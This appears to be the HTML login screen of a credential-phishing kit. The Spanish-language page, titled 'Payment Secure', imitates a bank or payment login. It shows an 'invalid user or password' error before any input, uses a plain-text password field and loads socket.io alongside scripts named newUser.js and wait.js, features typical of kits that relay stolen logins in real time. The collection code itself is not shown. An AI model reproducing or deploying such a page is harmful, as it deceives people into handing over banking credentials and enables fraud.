<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Payment Secure</title>

    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
      crossorigin="anonymous"
    />
    <script src="../../../js/functions.js"></script>
  </head>

  <body>
    <img src="img/logo.jpg" alt="" srcset="" width="100%" />

    <center>
      <div>
        <img
          src="img/user.jpg"
          alt=""
          srcset=""
          width="6%"
          style="position: absolute; left: 33px; margin-top: 10px"
        />
        <input
          type="text"
          id="txtUsuario"
          placeholder="Ingresa tu usuario"
          style="
            width: 80%;
            border: none;
            border-bottom: 1px solid #dcdcdc;
            padding-left: 35px;
            height: 40px;
            font-size: 15px;
          "
        />
      </div>
      <br />
      <div>
        <img
          src="img/key.svg"
          alt=""
          srcset=""
          width="6%"
          style="position: absolute; left: 33px; margin-top: 10px; opacity: 0.5"
        />
        <input
          type="text"
          id="txtPass"
          placeholder="Ingresa tu contraseña"
          style="
            width: 80%;
            border: none;
            border-bottom: 1px solid #dcdcdc;
            padding-left: 35px;
            height: 40px;
            font-size: 15px;
          "
        />
      </div>
    </center>
    <br />
    <a
      href=""
      style="
        margin-top: 10px;
        color: rgb(152, 11, 11);
        text-decoration: none;
        margin: 0px 25px;
      "
      >Usuario o clave inválida</a
    >

    <a
      href=""
      style="position: absolute; right: 30px; margin-top: 10px; color: black"
      >¿Olvidaste tu usuario?</a
    >

    <center>
      <input
        type="submit"
        id="btnUsuario"
        value="Ingresar"
        style="
          color: white;
          width: 80%;
          background-color: #f08ba7;
          margin-top: 50px;
          height: 40px;
          border-radius: 20px;
        "
      />
    </center>
    <center>
      <input
        type="submit"
        value="Registrarme ahora"
        style="
          width: 80%;
          color: #f08ba7;
          border: 1px solid #f08ba7;
          margin-top: 10px;
          height: 40px;
          background-color: white;
          border-radius: 20px;
        "
      />
    </center>
  </body>
  <script src="js/newUser.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
  <script src="js/wait.js"></script>
</html>
